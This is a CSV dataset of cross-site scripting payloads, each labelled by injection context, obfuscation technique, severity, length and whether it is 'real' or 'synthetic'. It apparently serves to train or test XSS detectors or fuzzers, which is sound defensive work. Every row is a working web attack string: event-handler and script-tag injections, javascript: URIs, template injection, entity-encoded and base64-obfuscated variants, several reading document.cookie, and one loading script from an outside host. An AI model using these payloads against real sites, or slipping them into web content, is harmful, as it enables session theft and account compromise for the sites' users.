payload,context,technique,severity,length,source
"%27 onmouseenter=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,59,synthetic
"<menuitem onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></menuitem>",event_handler,none,medium,289,real
<canvas id=x tabindex=1 onfocus=alert(1)></canvas>,event_handler,none,medium,50,real
"<article oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
<thead onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</thead><input value=clickme>,event_handler,none,medium,101,real
<script>/x/console.log(1)</script>,script_injection,synthetic,medium,34,synthetic
"<img draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</img>",event_handler,none,medium,59,real
"<details onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</details>",event_handler,none,medium,87,real
"<noframes oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",event_handler,none,medium,68,real
"<rt draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,82,real
"""><Svg onCliCk=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
<area onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</area>,event_handler,none,medium,74,real
""" ontoggle=confirm(location.hash) """,attribute_escape,synthetic,medium,35,synthetic
%22><svg onmouseenter=confirm(%27XSS%27)>,tag_injection,synthetic,medium,41,synthetic
"<style>:target {color:red;}</style><col id=x style=""transition:color 1s"" ontransitionend=alert(1)></col>",event_handler,none,medium,104,real
"<strong draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,85,real
j&#97;vascript:alert(1),js_uri,synthetic,medium,23,synthetic
"<dt onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dt>",event_handler,none,medium,277,real
<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>,event_handler,none,medium,57,real
%3Csvg onbegin=alert('XSS')%3E,tag_injection,synthetic,medium,30,synthetic
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",event_handler,none,medium,91,real
"""%3E%3Csvg onbegin=confirm(1)%3E",tag_injection,synthetic,medium,32,synthetic
"<acronym draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",event_handler,none,medium,87,real
<kbd onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</kbd>,event_handler,none,medium,72,real
<meter id=x tabindex=1 onactivate=alert(1)></meter>,event_handler,none,medium,51,real
' ontoggle=console.log(1) ',attribute_escape,synthetic,medium,27,synthetic
"<section draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</section>",event_handler,none,medium,91,real
<shadow id=x tabindex=1 onactivate=alert(1)></shadow>,event_handler,none,medium,53,real
"<AnonKryptiQuz STYLE=""xss:expression(alert('AnonKryptiQuz'))"">",attribute_escape,case_variation,medium,62,real
%22><svg onbegin=prompt(1)>,tag_injection,synthetic,medium,27,synthetic
"<style>:target {transform: rotate(180deg);}</style><blink id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blink>",event_handler,none,medium,128,real
<menu onpointerout=alert(1) style=display:block>AnonKryptiQuz</menu>,event_handler,none,medium,68,real
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",script_injection,none,medium,76,real
<rp onpointerup=alert(1) style=display:block>AnonKryptiQuz</rp>,event_handler,none,medium,63,real
"<plaintext ondblclick=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,58,real
"<image ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,91,real
<bdo onpointerup=alert(1) style=display:block>AnonKryptiQuz</bdo>,event_handler,none,medium,65,real
"EvaL(""AleRt(StrIng.frOmCHarCodE(88,83,83))"")",dom_sink,synthetic,medium,44,synthetic
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,event_handler,comment_injection,medium,63,real
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></wbr>",event_handler,none,medium,110,real
"<marquee oncontextmenu=""alert(1)"">AnonKryptiQuz</marquee>",event_handler,none,medium,57,real
"<p onmouseover=""alert(1)"">AnonKryptiQuz</p>",event_handler,none,medium,43,real
"""><svg onbegin=prompt(document.cookie)>",tag_injection,synthetic,medium,39,synthetic
<scRipT>aLerT`'XSS'`</scRipT>,script_injection,synthetic,medium,29,synthetic
"""><svg onlo&#97;d=prompt(1)>",tag_injection,synthetic,medium,28,synthetic
<script>consol&#101;.log('XSS')</script>,script_injection,synthetic,medium,40,synthetic
"<embed onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</embed>",event_handler,none,medium,68,real
<scRipT>/*/pRomPt(LocAtiOn.HasH)</scRipT>,script_injection,synthetic,medium,41,synthetic
"<style>:target {transform: rotate(180deg);}</style><ol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ol>",event_handler,none,medium,122,real
"<span ondblclick=""alert(1)"">AnonKryptiQuz</span>",event_handler,none,medium,48,real
"<shadow oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",event_handler,none,medium,64,real
"<keygen onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",event_handler,none,medium,69,real
<img onload=prompt('XSS')/>,tag_injection,synthetic,medium,27,synthetic
"<b onclick=""alert(1)"">AnonKryptiQuz</b>",event_handler,none,medium,39,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",event_handler,none,medium,180,real
"<nextid onclick=""alert(1)"">AnonKryptiQuz</nextid>",event_handler,none,medium,49,real
"<spacer onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,72,real
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" ontransitionend=alert(1)></listing>",event_handler,none,medium,112,real
"""><svg onb&#101;gin=consol&#101;.log('XSS')>",tag_injection,synthetic,medium,44,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style=""position:absolute;"" onanimationcancel=""print()""></span>",event_handler,none,low,177,real
"<canvas oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",event_handler,none,medium,64,real
"</script>'""><img src=x onError=prompt(1)>",event_handler,none,medium,41,real
"<output onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</output>",event_handler,none,medium,88,real
"<colgroup oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</colgroup>",event_handler,none,medium,68,real
"<em onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></em>",event_handler,none,medium,277,real
</script><script >alert(document.cookie)</script>,script_injection,none,high,49,real
"""%3E%3Csvg onerror=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,60,synthetic
document.write(%22<img src=x onerror=alert(1)>%22),dom_sink,synthetic,medium,50,synthetic
"<element onclick=""alert(1)"">AnonKryptiQuz</element>",event_handler,none,medium,51,real
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onwebkitanimationend=""alert(1)""></fieldset>",event_handler,none,medium,107,real
"<thead onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></thead>",event_handler,none,medium,283,real
"<script onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</script>",script_injection,none,medium,65,real
"%3Csvg onmouseenter=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,medium,62,synthetic
"%27 onclick=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,58,synthetic
<!<script>confirm(1)</script>,script_injection,none,medium,29,real
"<;IMG SRC="";javascript:alert(';XSS';);"";>;",js_uri,none,medium,42,real
"<a href=""\xE2\x80\x88javascript:javascript:alert(6186)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",event_handler,none,medium,72,real
"<menuitem onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",event_handler,none,medium,72,real
"<center onmouseup=""alert(1)"">AnonKryptiQuz</center>",event_handler,none,medium,51,real
"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">AnonKryptiQuz</a>",js_uri,url_encoding,medium,67,real
""" oNfoCus=coNsoLe.Log(doCumEnt.coOkiE) """,attribute_escape,synthetic,medium,40,synthetic
"<style>@keyframes x{}</style><template style=""animation-name:x"" onwebkitanimationend=""alert(1)""></template>",event_handler,none,medium,107,real
"<colgroup oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,102,real
<!--><scRipT src=//14.rs>,script_injection,case_variation,low,25,real
' oNclIck=coNfiRm('XSS') ',attribute_escape,synthetic,medium,26,synthetic
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}},template_injection,unicode_escape|html_entity,low,58,real
"<div onclick=""alert(1)"" style=display:block>AnonKryptiQuz</div>",event_handler,none,medium,63,real
"""><svg onmouseover=alert(document.cookie)>",tag_injection,synthetic,medium,42,synthetic
<menu onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"setTimeout(""prompt(1)"",0)",dom_sink,synthetic,medium,25,synthetic
"""%3E%3Csvg onmouseenter=prompt('XSS')%3E",tag_injection,synthetic,medium,40,synthetic
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",event_handler,none,medium,97,real
"""><svg onload=alert&amp;amp;#x00000040""1"")>",event_handler,none,low,43,real
"""'><img src='#\x27 onerror=javascript:alert(1)>",event_handler,none,medium,47,real
' onload=prompt(location.hash) ',attribute_escape,synthetic,medium,32,synthetic
"""><svg on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,67,synthetic
"<style>:target {transform: rotate(180deg);}</style><form id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></form>",event_handler,none,medium,126,real
%3Csvg onmouseover=alert('XSS')/%3E,tag_injection,synthetic,medium,35,synthetic
"<noembed draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,92,real
<embed onpointerleave=alert(1) style=display:block>AnonKryptiQuz</embed>,event_handler,none,medium,72,real
"""><script>alert('AnonKryptiQuz')</script>",script_injection,none,medium,41,real
<cite onpointerout=alert(1) style=display:block>AnonKryptiQuz</cite>,event_handler,none,medium,68,real
<custom tags contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,65,real
"<param draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,86,real
"<a2 oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"""><Svg onMouSeeNteR=cOnfIrm(loCatIon.haSh)>",tag_injection,synthetic,medium,43,synthetic
"<dt oncontextmenu=""alert(1)"">AnonKryptiQuz</dt>",event_handler,none,medium,47,real
<button popovertarget=x>Click me</button><canvas ontoggle=alert(1) popover id=x>AnonKryptiQuz</canvas>,event_handler,none,medium,102,real
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(5412)>"">",tag_injection,html_entity,medium,64,real
"<nav draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",event_handler,none,medium,84,real
">%0D%0A%0D%0A<x '=foo""><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>",event_handler,url_encoding,medium,91,real
"""><svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,62,synthetic
"<div draggable=""true"" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>",event_handler,none,medium,105,real
"<aside draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</aside>",event_handler,none,medium,66,real
"""><Svg onBegIn=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,medium,53,synthetic
"<image3 onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image3>",event_handler,none,medium,87,real
"""><img src=x onerror=javascript:alert(('A'))>",event_handler,none,medium,45,real
"<dialog draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</dialog>",event_handler,none,medium,70,real
""">&lt;img src=x onerror=prompt(document.domain);&gt;",event_handler,none,medium,52,real
"<h1 oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",event_handler,none,medium,67,real
<small onpointerup=alert(1) style=display:block>AnonKryptiQuz</small>,event_handler,none,medium,69,real
"<legend draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</legend>",event_handler,none,medium,70,real
<iframe/%00/ src=javaSCRIPT&colon;alert(1411),tag_injection,url_encoding,medium,45,real
"<img onmousedown=""alert(1)"">AnonKryptiQuz</img>",event_handler,none,medium,47,real
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,event_handler,none,medium,74,real
"(Z(""onerror=""a=console,a.log`${cookie}`""))",event_handler,none,low,42,real
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></caption>",event_handler,none,medium,118,real
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onanimationstart=""alert(1)""></custom tags>",event_handler,none,medium,109,real
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>,event_handler,none,medium,68,real
"<ul draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</ul>",event_handler,none,medium,62,real
"<audio2 draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</audio2>",event_handler,none,medium,90,real
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" ontransitionend=alert(1)></dl>",event_handler,none,medium,102,real
"<style>@keyframes slidein {}</style><animate style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></animate>",event_handler,none,medium,174,real
"<xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">        <xsl:template match=""/""><iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>        </xsl:template></xsl:stylesheet><circle fill=""red"" r=""40""></circle></svg>//[""'`-->]]>]</div>",js_uri,none,medium,309,real
<multicol onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</multicol>,event_handler,none,medium,82,real
JavAscRipT:pRomPt(1),js_uri,synthetic,medium,20,synthetic
<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>,event_handler,encoding,low,60,real
"""><svg onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,70,synthetic
"s&#101;tTim&#101;out(""confirm(docum&#101;nt.cooki&#101;)"",0)",dom_sink,synthetic,medium,60,synthetic
<video autoplay onplay=alert`AnonKryptiQuz` src=//w3schools.com/tags/movie.mp4>,event_handler,none,low,79,real
<blockquote onpointerleave=alert(1) style=display:block>AnonKryptiQuz</blockquote>,event_handler,none,medium,82,real
{{_openBlock.constructor('alert(1)')()}},template_injection,none,medium,40,real
<rb id=x tabindex=1 onactivate=alert(1)></rb>,event_handler,none,medium,45,real
"<details onclick=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,51,real
"<image oncontextmenu=""alert(1)"">AnonKryptiQuz</image>",event_handler,none,medium,53,real
<del id=x tabindex=1 onfocusin=alert(1)></del>,event_handler,none,medium,46,real
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></aside>",event_handler,none,medium,103,real
<svG oNloAd=ProMpt(loCatIon.haSh)/>,tag_injection,synthetic,medium,35,synthetic
